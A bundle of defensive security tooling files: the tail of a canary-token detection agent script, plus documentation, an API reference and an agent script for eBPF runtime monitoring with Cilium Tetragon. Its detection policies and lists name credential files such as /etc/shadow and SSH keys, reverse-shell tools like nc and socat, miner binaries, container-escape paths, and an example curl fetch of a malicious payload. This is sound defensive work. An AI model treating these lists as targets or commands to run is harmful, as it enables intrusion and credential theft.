    them into a single inventory.
    """
    inventory = {"tokens": [], "total": 0, "by_type": {}, "by_zone": {}}
    report_path = Path(report_dir)

    if not report_path.exists():
        logger.warning("Report directory not found: %s", report_dir)
        return inventory

    for report_file in report_path.glob("*.json"):
        with open(report_file, encoding="utf-8") as f:
            report = json.load(f)

        for token_key, token_data in report.get("tokens", {}).items():
            if isinstance(token_data, dict):
                inventory["tokens"].append(token_data)
                token_type = token_data.get("type", "unknown")
                inventory["by_type"][token_type] = (
                    inventory["by_type"].get(token_type, 0) + 1
                )

        if "deployment_plan" in report:
            for token_spec in report["deployment_plan"].get("tokens", []):
                zone = token_spec.get("zone", "unknown")
                inventory["by_zone"][zone] = (
                    inventory["by_zone"].get(zone, 0) + 1
                )

    inventory["total"] = len(inventory["tokens"])
    inventory["generated_at"] = datetime.now(timezone.utc).isoformat()
    return inventory


def check_token_alerts(webhook_log_path):
    """
    Parse webhook logs to identify triggered canary token alerts.

    Args:
        webhook_log_path: Path to the JSON log file from webhook receiver

    Returns:
        List of alert dicts with token details and trigger information
    """
    log_path = Path(webhook_log_path)
    if not log_path.exists():
        logger.warning("Webhook log not found: %s", webhook_log_path)
        return []

    alerts = []
    with open(log_path, encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            try:
                entry = json.loads(line)
            except json.JSONDecodeError:
                continue

            if entry.get("event_type") == "canarytoken_triggered":
                alerts.append({
                    "token_memo": entry.get("memo", ""),
                    "token_type": entry.get("token_type", ""),
                    "source_ip": entry.get("src_ip", ""),
                    "triggered_at": entry.get("time", ""),
                    "user_agent": entry.get("additional_data", {}).get("useragent", ""),
                    "manage_url": entry.get("manage_url", ""),
                    "severity": "high",
                })

    logger.info("Found %d triggered alerts in %s", len(alerts), webhook_log_path)
    return alerts


def test_token_connectivity(token_hostname=None, token_url=None):
    """
    Validate that a canary token is reachable and can trigger alerts.

    WARNING: This will trigger the actual canary token alert.
    Only use during initial deployment validation.
    """
    results = {"dns": None, "http": None}

    if token_hostname:
        try:
            resolved = socket.getaddrinfo(token_hostname, None)
            results["dns"] = {
                "status": "resolved",
                "hostname": token_hostname,
                "addresses": [r[4][0] for r in resolved],
            }
            logger.info("DNS token test: %s resolved successfully", token_hostname)
        except socket.gaierror as e:
            results["dns"] = {
                "status": "resolution_failed",
                "hostname": token_hostname,
                "error": str(e),
            }
            logger.warning("DNS token test failed for %s: %s", token_hostname, e)

    if token_url:
        try:
            resp = requests.get(token_url, timeout=10, allow_redirects=True)
            results["http"] = {
                "status": "reachable",
                "url": token_url,
                "http_status": resp.status_code,
            }
            logger.info("HTTP token test: %s returned %d", token_url, resp.status_code)
        except requests.RequestException as e:
            results["http"] = {
                "status": "unreachable",
                "url": token_url,
                "error": str(e),
            }
            logger.warning("HTTP token test failed for %s: %s", token_url, e)

    return results


# ---------------------------------------------------------------------------
# Main CLI
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="Canary Token Network Intrusion Detection Agent",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Actions:
  create_dns      Create a DNS canary token via Canarytokens.org
  create_http     Create an HTTP canary token
  create_aws      Create an AWS API key canary token
  create_web_img  Create a web image beacon canary token
  plan            Generate a deployment plan for an environment
  full_deploy     Create all token types and generate deployment plan
  monitor         Check for triggered alerts in webhook logs
  inventory       Build inventory from deployment reports
  test            Test connectivity to deployed tokens (triggers alerts!)

Examples:
  python agent.py --action plan --environment production
  python agent.py --action create_dns --email soc@company.com --webhook https://hooks.slack.com/...
  python agent.py --action full_deploy --email soc@company.com --output deploy_report.json
  python agent.py --action monitor --webhook-log /var/log/canary_alerts.json
        """,
    )
    parser.add_argument("--action", required=True, choices=[
        "create_dns", "create_http", "create_aws", "create_web_img",
        "plan", "full_deploy", "monitor", "inventory", "test",
    ])
    parser.add_argument("--email", default=os.getenv("CANARY_EMAIL", "soc@company.com"),
                        help="Notification email for token alerts")
    parser.add_argument("--webhook", default=os.getenv("CANARY_WEBHOOK"),
                        help="Webhook URL for real-time alerts (Slack/Teams/generic)")
    parser.add_argument("--memo", default=None,
                        help="Human-readable description for the token")
    parser.add_argument("--environment", default="production",
                        help="Target environment for deployment plan")
    parser.add_argument("--zones", nargs="*", default=None,
                        help="Network zones to include in deployment plan")
    parser.add_argument("--output", default="canary_token_report.json",
                        help="Output file path for report")
    parser.add_argument("--webhook-log", default="/var/log/canary_alerts.json",
                        help="Path to webhook alert log for monitoring")
    parser.add_argument("--report-dir", default="./reports",
                        help="Directory containing deployment reports for inventory")
    parser.add_argument("--console-domain", default=os.getenv("THINKST_DOMAIN"),
                        help="Thinkst Canary console domain (enterprise)")
    parser.add_argument("--api-key", default=os.getenv("THINKST_API_KEY"),
                        help="Thinkst Canary API auth token (enterprise)")
    parser.add_argument("--test-hostname", default=None,
                        help="DNS hostname to test connectivity")
    parser.add_argument("--test-url", default=None,
                        help="HTTP URL to test connectivity")
    args = parser.parse_args()

    report = {
        "agent": "canary-token-intrusion-detection",
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "action": args.action,
        "tokens": {},
    }

    # --- Deployment Plan ---
    if args.action == "plan":
        plan = create_deployment_plan(args.environment, args.zones)
        report["deployment_plan"] = plan
        print(f"[+] Deployment plan generated: {plan['total_tokens']} tokens across "
              f"{len(plan['zones'])} zones")
        for token in plan["tokens"]:
            print(f"    [{token['zone']}] {token['type']:10s} -> {token['location']}")

    # --- DNS Token ---
    if args.action in ("create_dns", "full_deploy"):
        memo = args.memo or f"DNS canary -- {args.environment}"
        token = create_dns_token(args.email, memo, args.webhook)
        report["tokens"]["dns"] = token
        print(f"[+] DNS canary token created: {token.get('hostname', 'N/A')}")

    # --- HTTP Token ---
    if args.action in ("create_http", "full_deploy"):
        memo = args.memo or f"HTTP canary -- {args.environment}"
        token = create_http_token(args.email, memo, args.webhook)
        report["tokens"]["http"] = token
        print(f"[+] HTTP canary token created: {token.get('url', 'N/A')}")

    # --- AWS Key Token ---
    if args.action in ("create_aws", "full_deploy"):
        memo = args.memo or f"AWS key canary -- {args.environment}"
        token = create_aws_key_token(args.email, memo, args.webhook)
        report["tokens"]["aws_keys"] = token
        print(f"[+] AWS key canary token created: {token.get('access_key_id', 'N/A')}")

    # --- Web Image Token ---
    if args.action in ("create_web_img", "full_deploy"):
        memo = args.memo or f"Web beacon canary -- {args.environment}"
        token = create_web_image_token(args.email, memo, args.webhook)
        report["tokens"]["web_image"] = token
        print(f"[+] Web image canary token created: {token.get('image_url', 'N/A')}")

    # --- Full Deploy also generates plan ---
    if args.action == "full_deploy":
        plan = create_deployment_plan(args.environment, args.zones)
        report["deployment_plan"] = plan
        print(f"[+] Deployment plan: {plan['total_tokens']} tokens planned")

    # --- Monitor ---
    if args.action == "monitor":
        if args.console_domain and args.api_key:
            alerts = thinkst_get_alerts(args.console_domain, args.api_key)
            report["enterprise_alerts"] = alerts
            print(f"[+] Thinkst Canary: {len(alerts)} triggered alerts found")
            for alert in alerts:
                print(f"    [ALERT] {alert}")
        else:
            alerts = check_token_alerts(args.webhook_log)
            report["webhook_alerts"] = alerts
            print(f"[+] Webhook log: {len(alerts)} triggered alerts found")
            for alert in alerts:
                print(f"    [ALERT] {alert.get('token_memo', 'Unknown')} "
                      f"from {alert.get('source_ip', 'Unknown')} "
                      f"at {alert.get('triggered_at', 'Unknown')}")

    # --- Inventory ---
    if args.action == "inventory":
        inventory = build_token_inventory(args.report_dir)
        report["inventory"] = inventory
        print(f"[+] Token inventory: {inventory['total']} tokens")
        for token_type, count in inventory.get("by_type", {}).items():
            print(f"    {token_type}: {count}")

    # --- Test ---
    if args.action == "test":
        print("[!] WARNING: Testing tokens will trigger real alerts!")
        results = test_token_connectivity(args.test_hostname, args.test_url)
        report["test_results"] = results
        for test_type, result in results.items():
            if result:
                print(f"    [{test_type}] {result.get('status', 'unknown')}")

    # --- Write report ---
    output_path = Path(args.output)
    output_path.parent.mkdir(parents=True, exist_ok=True)
    with open(output_path, "w", encoding="utf-8") as f:
        json.dump(report, f, indent=2, default=str)
    print(f"[+] Report saved to {args.output}")


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/implementing-ebpf-security-monitoring/SKILL.md =====
---
name: implementing-ebpf-security-monitoring
description: 'Implements eBPF-based security monitoring using Cilium Tetragon for
  real-time process execution tracking, network connection observability, file access
  auditing, and runtime enforcement. Covers TracingPolicy CRD authoring with kprobe/tracepoint
  hooks, in-kernel filtering via matchArgs/matchBinaries selectors, JSON event export,
  and integration with SIEM pipelines. Use when building kernel-level runtime security
  observability for Linux hosts or Kubernetes clusters.

  '
domain: cybersecurity
subdomain: security-operations
tags:
- ebpf
- tetragon
- cilium
- runtime-security
- observability
- kernel-security
- kubernetes-security
version: '1.0'
author: mukul975
license: Apache-2.0
nist_ai_rmf:
- MEASURE-2.7
- MAP-5.1
- MANAGE-2.4
atlas_techniques:
- AML.T0070
- AML.T0066
- AML.T0082
nist_csf:
- DE.CM-01
- RS.MA-01
- GV.OV-01
- DE.AE-02
mitre_attack:
- T1078
- T1190
- T1059
- T1685.002
- T1685.005
---

# Implementing eBPF Security Monitoring

## When to Use

- When deploying kernel-level runtime security monitoring on Linux hosts or Kubernetes clusters
- When you need sub-millisecond visibility into process execution, network connections, and file access
- When traditional userspace monitoring tools introduce unacceptable performance overhead
- When building detection pipelines that require in-kernel filtering before events reach userspace
- When enforcing runtime security policies (kill process, send signal) at the kernel level

## Prerequisites

- Linux kernel 5.3+ with BTF (BPF Type Format) support enabled
- Kubernetes 1.24+ cluster (for Kubernetes deployment) or standalone Linux host
- Helm 3.x installed (for Kubernetes deployment)
- `kubectl` configured with cluster access
- `tetra` CLI installed for local event streaming
- Python 3.8+ with `requests`, `kubernetes`, `pyyaml` dependencies
- Root or CAP_BPF/CAP_SYS_ADMIN capabilities for eBPF program loading

## Instructions

### 1. Install Tetragon on Kubernetes

Deploy Tetragon via Helm to get default process lifecycle observability:

```bash
helm repo add cilium https://helm.cilium.io
helm repo update
helm install tetragon cilium/tetragon -n kube-system \
  --set tetragon.enableProcessCred=true \
  --set tetragon.enableProcessNs=true
```

Verify the installation:

```bash
kubectl get pods -n kube-system -l app.kubernetes.io/name=tetragon
kubectl logs -n kube-system -l app.kubernetes.io/name=tetragon -c export-stdout -f | head -20
```

### 2. Install Tetragon on Standalone Linux

For non-Kubernetes Linux hosts, install from the tarball release:

```bash
curl -LO https://github.com/cilium/tetragon/releases/latest/download/tetragon-linux-amd64.tar.gz
tar xzf tetragon-linux-amd64.tar.gz
sudo cp tetragon /usr/local/bin/
sudo cp tetra /usr/local/bin/

# Start tetragon daemon
sudo tetragon --btf /sys/kernel/btf/vmlinux &

# Stream events
tetra getevents -o compact
```

### 3. Monitor Process Execution (Default)

Tetragon generates `process_exec` and `process_exit` events by default without any TracingPolicy:

```bash
# Stream process events in compact format
tetra getevents -o compact

# Stream in JSON for SIEM ingestion
tetra getevents -o json | jq '.process_exec // .process_exit'
```

Example `process_exec` JSON event:

```json
{
  "process_exec": {
    "process": {
      "binary": "/usr/bin/curl",
      "arguments": "https://malicious.example.com/payload",
      "cwd": "/tmp",
      "uid": 1000,
      "pod": {
        "namespace": "default",
        "name": "webapp-7b4d9f8c6-x2k9p"
      },
      "parent": {
        "binary": "/bin/bash",
        "pid": 1234
      }
    }
  }
}
```

### 4. Author TracingPolicy for File Access Monitoring

Create a TracingPolicy CRD to monitor access to sensitive files via the `sys_openat` kprobe:

```yaml
# file-access-monitor.yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: monitor-sensitive-file-access
spec:
  kprobes:
    - call: "fd_install"
      syscall: false
      args:
        - index: 0
          type: "int"
        - index: 1
          type: "file"
      selectors:
        - matchArgs:
            - index: 1
              operator: "Prefix"
              values:
                - "/etc/shadow"
                - "/etc/passwd"
                - "/etc/sudoers"
                - "/root/.ssh/"
                - "/etc/kubernetes/pki/"
          matchActions:
            - action: Post
```

Apply and observe:

```bash
kubectl apply -f file-access-monitor.yaml
tetra getevents -o compact --process-filter "event_set:PROCESS_KPROBE"
```

### 5. Author TracingPolicy for Network Connection Monitoring

Monitor outbound TCP connections using the `tcp_connect` kprobe:

```yaml
# network-monitor.yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: monitor-tcp-connections
spec:
  kprobes:
    - call: "tcp_connect"
      syscall: false
      args:
        - index: 0
          type: "sock"
      selectors:
        - matchActions:
            - action: Post
```

### 6. Author TracingPolicy for Privilege Escalation Detection

Detect setuid/setgid calls that may indicate privilege escalation:

```yaml
# privilege-escalation-detect.yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: detect-privilege-escalation
spec:
  kprobes:
    - call: "__sys_setuid"
      syscall: false
      args:
        - index: 0
          type: "int"
      selectors:
        - matchArgs:
            - index: 0
              operator: "Equal"
              values:
                - "0"
          matchActions:
            - action: Post
    - call: "commit_creds"
      syscall: false
      args:
        - index: 0
          type: "cred"
      selectors:
        - matchActions:
            - action: Post
```

### 7. Runtime Enforcement with Sigkill Action

Block unauthorized binary execution by killing the process in-kernel:

```yaml
# enforce-binary-allowlist.yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: enforce-no-crypto-miners
spec:
  kprobes:
    - call: "sys_execve"
      syscall: true
      args:
        - index: 0
          type: "string"
      selectors:
        - matchArgs:
            - index: 0
              operator: "Postfix"
              values:
                - "xmrig"
                - "minerd"
                - "cpuminer"
                - "cryptonight"
          matchActions:
            - action: Sigkill
```

### 8. Export Events to SIEM

Configure Tetragon to export JSON events to a file sink for Fluentd/Filebeat/Vector ingestion:

```bash
# Helm values for file export
helm upgrade tetragon cilium/tetragon -n kube-system \
  --set tetragon.exportFilename=/var/log/tetragon/tetragon.log \
  --set tetragon.exportFileMaxSizeMB=100 \
  --set tetragon.exportFileMaxBackups=5
```

Then configure your log shipper (e.g., Filebeat) to tail `/var/log/tetragon/tetragon.log` and send to your SIEM.

### 9. Kubernetes-Aware Namespace Filtering

Use `TracingPolicyNamespaced` to scope monitoring to specific namespaces:

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicyNamespaced
metadata:
  name: monitor-production-file-access
  namespace: production
spec:
  kprobes:
    - call: "fd_install"
      syscall: false
      args:
        - index: 0
          type: "int"
        - index: 1
          type: "file"
      selectors:
        - matchArgs:
            - index: 1
              operator: "Prefix"
              values:
                - "/etc/shadow"
                - "/etc/passwd"
```

## Examples

### Detect Reverse Shell Connections

```yaml
# reverse-shell-detect.yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: detect-reverse-shells
spec:
  kprobes:
    - call: "tcp_connect"
      syscall: false
      args:
        - index: 0
          type: "sock"
      selectors:
        - matchBinaries:
            - operator: "In"
              values:
                - "/bin/bash"
                - "/bin/sh"
                - "/usr/bin/python3"
                - "/usr/bin/perl"
                - "/usr/bin/nc"
                - "/usr/bin/ncat"
          matchActions:
            - action: Post
```

### Monitor Container Escape Attempts

```yaml
# container-escape-detect.yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: detect-container-escape
spec:
  kprobes:
    - call: "sys_openat"
      syscall: true
      args:
        - index: 0
          type: "int"
        - index: 1
          type: "string"
      selectors:
        - matchArgs:
            - index: 1
              operator: "Prefix"
              values:
                - "/proc/1/root"
                - "/proc/1/ns"
                - "/sys/kernel/security"
                - "/proc/sysrq-trigger"
          matchActions:
            - action: Post
    - call: "sys_mount"
      syscall: true
      args:
        - index: 0
          type: "string"
        - index: 1
          type: "string"
        - index: 2
          type: "string"
      selectors:
        - matchActions:
            - action: Post
```

### Full Event Pipeline: Tetragon to Elasticsearch

```bash
# Use tetra CLI to pipe events through jq into Elasticsearch
tetra getevents -o json | jq -c 'select(.process_kprobe != null)' | \
  while IFS= read -r line; do
    curl -s -X POST "http://elasticsearch:9200/tetragon-events/_doc" \
      -H "Content-Type: application/json" \
      -d "$line"
  done
```

===== END FILE =====


===== FILE: skills/implementing-ebpf-security-monitoring/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/implementing-ebpf-security-monitoring/references/api-reference.md =====
# API Reference: Implementing eBPF Security Monitoring with Tetragon

## Tetragon Installation (Helm)

```bash
# Add Cilium Helm repo
helm repo add cilium https://helm.cilium.io
helm repo update

# Install with recommended security settings
helm install tetragon cilium/tetragon -n kube-system \
  --set tetragon.enableProcessCred=true \
  --set tetragon.enableProcessNs=true \
  --set tetragon.exportFilename=/var/log/tetragon/tetragon.log

# Standalone Linux (non-Kubernetes)
curl -LO https://github.com/cilium/tetragon/releases/latest/download/tetragon-linux-amd64.tar.gz
sudo tetragon --btf /sys/kernel/btf/vmlinux
```

## TracingPolicy CRD Schema

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy          # or TracingPolicyNamespaced
metadata:
  name: policy-name
spec:
  kprobes:                   # List of kprobe hooks
    - call: "function_name"  # Kernel function to hook
      syscall: true|false    # Whether this is a syscall
      args:                  # Arguments to capture
        - index: 0
          type: "string|int|fd|file|sock|cred|char_buf|size_t"
      selectors:             # In-kernel filtering
        - matchArgs:
            - index: 0
              operator: "Equal|NotEqual|Prefix|Postfix|Mask|In|NotIn"
              values: ["value1", "value2"]
          matchBinaries:
            - operator: "In|NotIn"
              values: ["/usr/bin/binary"]
          matchActions:
            - action: "Post|Sigkill|Signal|Override|FollowFD|CopyFD"
```

## Common Kprobe Hook Points

| Hook Function | Syscall | Use Case |
|---------------|---------|----------|
| `sys_execve` | true | Process execution monitoring |
| `fd_install` | false | File descriptor / file open monitoring |
| `sys_openat` | true | File open with path |
| `sys_write` | true | File write monitoring |
| `tcp_connect` | false | Outbound TCP connections |
| `tcp_sendmsg` | false | TCP data sent |
| `__sys_setuid` | false | Privilege escalation (setuid) |
| `commit_creds` | false | Credential changes |
| `sys_mount` | true | Filesystem mount operations |
| `sys_ptrace` | true | Process tracing / debugging |

## Argument Types

| Type | Description |
|------|-------------|
| `string` | Null-terminated string |
| `int` | Integer value |
| `fd` | File descriptor (resolved to path) |
| `file` | File structure (includes path) |
| `sock` | Socket structure (includes IP/port) |
| `cred` | Credentials structure (uid/gid) |
| `char_buf` | Character buffer (requires sizeArgIndex) |
| `size_t` | Size type |

## Selector Operators

| Operator | Description | Example |
|----------|-------------|---------|
| `Equal` | Exact match | `values: ["0"]` |
| `NotEqual` | Not equal | `values: ["0"]` |
| `Prefix` | String prefix | `values: ["/etc/"]` |
| `Postfix` | String suffix | `values: ["xmrig"]` |
| `Mask` | Bitmask match | `values: ["0x1"]` |
| `In` | Value in set | `values: ["/bin/bash", "/bin/sh"]` |
| `NotIn` | Value not in set | `values: ["/usr/sbin/sshd"]` |

## Match Actions

| Action | Description |
|--------|-------------|
| `Post` | Emit event to userspace (default) |
| `Sigkill` | Kill the process immediately |
| `Signal` | Send specified signal |
| `Override` | Override return value |
| `FollowFD` | Track file descriptor across calls |
| `CopyFD` | Copy file descriptor info |

## tetra CLI Commands

```bash
# Stream events in compact format
tetra getevents -o compact

# Stream events in JSON
tetra getevents -o json

# Filter by namespace
tetra getevents -o compact --namespace production

# Filter by pod
tetra getevents -o compact --pod webapp-7b4d9f8c6-x2k9p

# Health check
tetra status

# Version
tetra version
```

## Tetragon gRPC API

```protobuf
service FineGuidanceSensors {
  rpc GetEvents(GetEventsRequest) returns (stream GetEventsResponse) {}
  rpc GetHealth(GetHealthStatusRequest) returns (GetHealthStatusResponse) {}
}
```

## JSON Event Types

```json
// process_exec event
{
  "process_exec": {
    "process": {
      "exec_id": "abc123",
      "pid": 1234,
      "uid": 1000,
      "binary": "/usr/bin/curl",
      "arguments": "-O https://example.com/file",
      "cwd": "/tmp",
      "start_time": "2026-01-15T10:30:00Z",
      "pod": {"namespace": "default", "name": "webapp-xxx"},
      "parent": {"binary": "/bin/bash", "pid": 1200}
    }
  }
}

// process_kprobe event (triggered by TracingPolicy)
{
  "process_kprobe": {
    "process": {"binary": "/usr/bin/cat", "pid": 5678},
    "policy_name": "monitor-sensitive-file-access",
    "function_name": "fd_install",
    "args": [
      {"file_arg": {"path": "/etc/shadow"}}
    ]
  }
}

// process_exit event
{
  "process_exit": {
    "process": {"binary": "/usr/bin/curl", "pid": 1234},
    "status": 0,
    "signal": ""
  }
}
```

## Log Export Configuration

```yaml
# Helm values for SIEM integration
tetragon:
  exportFilename: /var/log/tetragon/tetragon.log
  exportFileMaxSizeMB: 100
  exportFileMaxBackups: 5
  exportRateLimit: 1000       # events/second
  exportAllowList: ""         # JSON filter for allowed events
  exportDenyList: ""          # JSON filter for denied events
```

### References

- Tetragon Documentation: https://tetragon.io/docs/
- Tetragon GitHub: https://github.com/cilium/tetragon
- eBPF.io: https://ebpf.io/
- Cilium: https://cilium.io/
- TracingPolicy Examples: https://github.com/cilium/tetragon/tree/main/examples/tracingpolicy
- Tetragon gRPC API: https://tetragon.io/docs/reference/grpc-api/
- Isovalent Blog: https://isovalent.com/blog/

===== END FILE =====


===== FILE: skills/implementing-ebpf-security-monitoring/scripts/agent.py =====
#!/usr/bin/env python3
"""Agent for deploying and managing eBPF security monitoring with Cilium Tetragon."""

import os
import sys
import json
import yaml
import shutil
import argparse
import subprocess
import tempfile
from datetime import datetime, timezone


TRACING_POLICY_TEMPLATE = {
    "apiVersion": "cilium.io/v1alpha1",
    "kind": "TracingPolicy",
    "metadata": {"name": ""},
    "spec": {"kprobes": []},
}

SENSITIVE_FILES = [
    "/etc/shadow",
    "/etc/passwd",
    "/etc/sudoers",
    "/etc/sudoers.d/",
    "/root/.ssh/",
    "/etc/kubernetes/pki/",
    "/var/run/secrets/kubernetes.io/",
    "/etc/ssl/private/",
]

SUSPICIOUS_BINARIES = [
    "/bin/bash",
    "/bin/sh",
    "/usr/bin/python3",
    "/usr/bin/python",
    "/usr/bin/perl",
    "/usr/bin/nc",
    "/usr/bin/ncat",
    "/usr/bin/socat",
    "/usr/bin/curl",
    "/usr/bin/wget",
]

CRYPTO_MINERS = [
    "xmrig",
    "minerd",
    "cpuminer",
    "cryptonight",
    "stratum+tcp",
    "nicehashminer",
    "ethminer",
    "nbminer",
]

CONTAINER_ESCAPE_PATHS = [
    "/proc/1/root",
    "/proc/1/ns",
    "/sys/kernel/security",
    "/proc/sysrq-trigger",
    "/proc/kcore",
    "/sys/fs/cgroup",
]


def check_prerequisites():
    """Verify that required tools are available on the system."""
    results = {}
    for tool in ["kubectl", "helm", "tetra"]:
        results[tool] = shutil.which(tool) is not None
    try:
        result = subprocess.run(
            ["uname", "-r"], capture_output=True, text=True, timeout=5
        )
        kernel_version = result.stdout.strip() if result.returncode == 0 else "unknown"
    except (FileNotFoundError, subprocess.TimeoutExpired):
        kernel_version = "unknown"

    btf_available = os.path.exists("/sys/kernel/btf/vmlinux")
